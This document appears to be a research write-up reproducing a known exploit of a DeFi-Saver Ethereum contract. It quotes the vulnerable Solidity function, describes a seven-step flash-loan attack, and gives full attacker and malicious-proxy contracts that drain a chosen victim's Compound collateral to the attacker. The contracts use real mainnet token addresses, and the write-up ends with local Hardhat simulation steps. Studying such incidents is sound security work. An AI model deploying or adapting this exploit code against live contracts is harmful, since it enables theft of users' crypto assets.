
# Attack #2: DeFi-Saver


## Attack Vector

The attack vector is described in full detail here:

[https://medium.com/dedaub/ethereum-pawn-stars-5-7m-in-hard-assets-best-i-can-do-is-2-3m](https://medium.com/dedaub/ethereum-pawn-stars-5-7m-in-hard-assets-best-i-can-do-is-2-3m-b93604be503e)


### Vulnerable Code

```solidity
    /// @notice Called by Aave when sending back the FL amount
    /// @param _reserve The address of the borrowed token
    /// @param _amount Amount of FL tokens received
    /// @param _fee FL Aave fee
    /// @param _params The params that are sent from the original FL caller contract
    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params)
    external override {

        (
            address cCollateralToken,
            address cBorrowToken,
            address user,
            address proxy
        )
        = abi.decode(_params, (address,address,address,address));

        // approve FL tokens so we can repay them
        ERC20(_reserve).safeApprove(cBorrowToken, 0);
        ERC20(_reserve).safeApprove(cBorrowToken, uint(-1));

        // repay compound debt
        require(CTokenInterface(cBorrowToken).repayBorrowBehalf(user, uint(-1)) == 0, "Repay borrow behalf fail");

        // transfer cTokens to proxy
        uint cTokenBalance = CTokenInterface(cCollateralToken).balanceOf(user);
        require(CTokenInterface(cCollateralToken).transferFrom(user, proxy, cTokenBalance));

        // borrow
        bytes memory proxyData = getProxyData(cCollateralToken, cBorrowToken, _reserve, (_amount + _fee));
        DSProxyInterface(proxy).execute(COMPOUND_BORROW_PROXY, proxyData);

        // Repay the loan with the money DSProxy sent back
        transferFundsBackToPoolInternal(_reserve, _amount.add(_fee));
    }
```

This code is executed after a **Flash Loan** with *_reserve* tokens is received.
The FL is used to repay Compound Loans issued in the *_reserve* currency.
Then, the contract transfers **all** of the caller-specified currency of the (called-specified) user to a (caller-specified) proxy.
Next, the contract instructs the proxy to issue a Compound Loan using caller-specified currencies as collateral and borrow tokens (though *borrow* must be the *_reserve* currency), and then transfer the funds back to the original contract, so that it can repay the FL.


### Attack Scheme

Our attack mainly consists of the following steps:
1) Issue a Flash Loan targeting the vulnerable contract. Exploit caller-specified parameters to target a victim that **(a)** has (exactly one) outstanding Compound Loan in a *cBorrowToken* and **(b)** has granted a lot of approval to a *cCollateralToken* to the service. The Flash Loan amount should equal the debt of the victim to Compound.
2) The vulnerable contract will repay the victim's loan and then send all of the victim's *cCollateralTokens* to a caller-specified proxy. Our malicious proxy will of course implement the *DSProxyInterface* thus the Compound Loan can be issued without interference from the attacker.
*Our proxy now has the victim's **cCollateralTokens**, but also has a Compound Loan equal to the amount of the Flash Loan issued.*
3) Issue another Flash Loan in the *BorrowToken* currency and repay the Compound Loan.
4) Redeem the *cCollateralTokens* and get *CollateralTokens*.
5) Swap *CollateralTokens* for *BorrowTokens*.
6) Repay the proxy's Flash Loan.
7) Send the remaining *BorrowTokens* to the attacker.

By doing so, we end up with the *cCollaterTokens* ETH value minus the initial *Flash Loan* ETH value in the attacker contract.


## Attack Contract Implementation

Issue the *Flash Loan* targeting the Vulnerable Contract and our victim (selected *a priori*, with dynamic info).

```solidity
    function exploit() public {
        uint256 victimLoanAmount = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(victimAddr);
        bytes memory params = abi.encode(cWBTC_addr, cUSDC_addr, victimAddr, targetProxy);
        ILendingPool(aaveV1).flashLoan(vulnContrAddr, USDC_addr, victimLoanAmount, params);
    }

```

Request the stolen funds from the malicious proxy.

```solidity
    function transferFunds() public {
        address attackerAccount = address(this);
        bytes memory proxyData = abi.encodeWithSignature( "sendMoreMoney(address)", attackerAccount );
        DSProxyInterface(targetProxy).execute(targetProxy, proxyData);
    }
```

## Malicious Proxy Implementation

The proxy gets the *cCollateralTokens* sent from the Vulnerable Contract, then issues a Compound Loan and transfer its funds to the Vulnerable Contract.
This is automatically handled by the **DeFiSaverWallet** code we based our malicious proxy at.
The extra feature we employed, is that we repay the Compound Loan and convert **all** of the *cCollateralTokens* to a stable-coin (USDC) before ultimately transferring the remaining funds to the Attacker.

The algorithm is the following (see [Notes](##Notes) on why these currencies are used):

1) Get a Flash Loan in USDC 
2) Repay Compound loan of cUSDC
3) Redeem all cWBTC from Compound
4) Convert WBTC to USDC
5) Repay the Flash Loan
6) Send the Full USDC amount to the Attacker

And the implementation:

```solidity
    address payable cWBTC_addr = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address payable cUSDC_addr = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address payable USDC_addr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address payable WBTC_addr = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    function sendMoreMoney(address _to) public {

        // 1) Get a Flash Loan in USDC 

        bytes memory data = "";
        uint256 borrowAmount = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(address(this));

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), USDC_addr, borrowAmount, data);

        // 6) Send the Full USDC amount to the Attacker
        uint256 totalUSDCBalance = ERC20(USDC_addr).balanceOf(address(this));
        ERC20(USDC_addr).transfer(_to, totalUSDCBalance);
    }


    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params)
    external override {

        // 2) Repay Compound loan of cUSDC

        uint256 debtLeft = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(address(this));
        ERC20(USDC_addr).approve(cUSDC_addr, debtLeft);
        CTokenInterface(cUSDC_addr).repayBorrow(debtLeft);

        // 3) Redeem cWBTC from Compound

        uint256 totalCWBTCBalance = CTokenInterface(cWBTC_addr).balanceOf(address(this));
        CTokenInterface(cWBTC_addr).redeem( totalCWBTCBalance );
        uint256 totalWBCTBalance = ERC20(WBTC_addr).balanceOf(address(this));

        // 4) Convert WBTC to USDC via UniswapV2
        swap(WBTC_addr, USDC_addr, totalWBCTBalance, 10, address(this));

        // 5) Repay the Flash Loan
        transferFundsBackToPoolInternal(_reserve, _amount.add(_fee));
    }
```

## Simulate the Attack

Inside `~/hardhat-projects/defi-saver-ys/` run:

Terminal #0:

```bash
$ npx hardhat node
```

Terminal #1:
```bash
$ npx hardhat run scripts/test-local-script.js
```

You should end up with the Attacker's USDC amount in Terminal #0.


## Notes

This implementation of the attack is tailored to a [specific](https://ethtx.info/0xf0a1107a2beeeec5a895fedb82ce767096acd510b61f7de5619117fa00558501/) user-victim (the same as in the [medium](##Attack_Vector) post), since a lot of dynamic info needs to be gathered in order for it to succeed.
However, there is a more [generic implementation](https://contract-library.com/contracts/Ethereum/b793Dc5B1DaAb909468D9b967b7d2a482e1ebFc4) built by the DeFi-Saver team, in order to use their own vulnerability to secure the threatened funds.
